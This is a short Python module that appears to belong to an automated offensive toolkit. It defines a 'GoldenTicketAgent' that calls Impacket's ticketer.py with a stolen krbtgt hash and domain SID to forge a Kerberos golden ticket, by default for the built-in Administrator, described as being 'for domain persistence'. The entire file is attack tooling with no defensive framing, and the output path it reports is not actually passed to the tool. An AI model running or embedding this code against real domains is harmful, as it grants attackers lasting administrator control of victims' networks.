"""Golden Ticket Agent - Forge Kerberos TGT tickets"""
import asyncio, os
from typing import Dict, Any
from core.base_agent import BaseAgent
from core.agent_data import AgentData

class GoldenTicketAgent(BaseAgent):
    def __init__(self):
        super().__init__(name="GoldenTicketAgent", description="Forge golden tickets for domain persistence", version="1.0.0")
        self.output_dir = "workspace/golden_ticket"
        os.makedirs(self.output_dir, exist_ok=True)
    
    async def run(self, strategy: Dict[str, Any]) -> AgentData:
        try:
            domain, domain_sid, krbtgt_hash = strategy.get('domain'), strategy.get('domain_sid'), strategy.get('krbtgt_hash')
            username = strategy.get('username', 'Administrator')
            user_id = strategy.get('user_id', '500')
            
            if not all([domain, domain_sid, krbtgt_hash]):
                return AgentData(success=False, errors=["Missing domain, domain_sid, or krbtgt_hash"])
            
            ticket_file = f'{self.output_dir}/golden_ticket.ccache'
            cmd = ['ticketer.py', '-nthash', krbtgt_hash, '-domain-sid', domain_sid, '-domain', domain, '-user-id', user_id, username]
            process = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            await process.communicate()
            
            return AgentData(success=process.returncode == 0, data={'ticket_file': ticket_file, 'username': username})
        except Exception as e:
            return AgentData(success=False, errors=[str(e)])
